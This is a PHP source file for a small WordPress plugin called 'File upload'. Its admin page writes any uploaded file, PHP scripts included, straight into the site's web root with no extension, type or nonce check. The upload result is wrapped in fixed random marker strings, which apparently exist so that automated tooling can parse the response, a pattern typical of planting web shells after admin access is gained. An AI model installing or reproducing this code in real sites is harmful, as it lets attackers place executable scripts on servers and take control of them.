<?php
/*
Plugin Name: File upload
*/

add_action( 'admin_menu', 'extra_post_info_menu' );

function extra_post_info_menu(){

  $page_title = 'File upload';
  $menu_title = 'File upload';
  $capability = 'manage_options';
  $menu_slug  = 'file-upload';
  $function   = 'file_upload_page';
  $icon_url   = '';
  $position   = null;

  add_menu_page( $page_title,
      $menu_title,
      $capability,
      $menu_slug,
      $function,
      $icon_url,
      $position );
}

function mb_strrev($str){
  $r = '';
  for ($i = mb_strlen($str); $i>=0; $i--) {
    $r .= mb_substr($str, $i, 1);
  }
  return $r;
}

function file_upload_page() {
  if (!empty($_FILES) and !empty($_FILES["file_upload"])) {
    echo "\ngb45CAA2QtDZtom|";
    list($ext, $name) = explode(".", mb_strrev(basename($_FILES["file_upload"]["name"])),2);
    $ext = mb_strrev($ext);
    $name = mb_strrev($name);
    $new_name = $name;
    for ($n=1; file_exists(get_home_path()."$new_name.$ext"); $n++) {
      $new_name = $name."_".$n;
    }
    $target_file = get_home_path().$new_name.".".$ext;
    if (move_uploaded_file($_FILES["file_upload"]["tmp_name"], $target_file)) {
      echo "The file ". basename( $_FILES["file_upload"]["name"]). " has been uploaded. Path: ".$target_file;
    } else {
      echo "Sorry, there was an error uploading your file.";
    }
    echo "|gb45CAA2QtDZtom\n";
  }
  require "includes/acp-page.php";

}



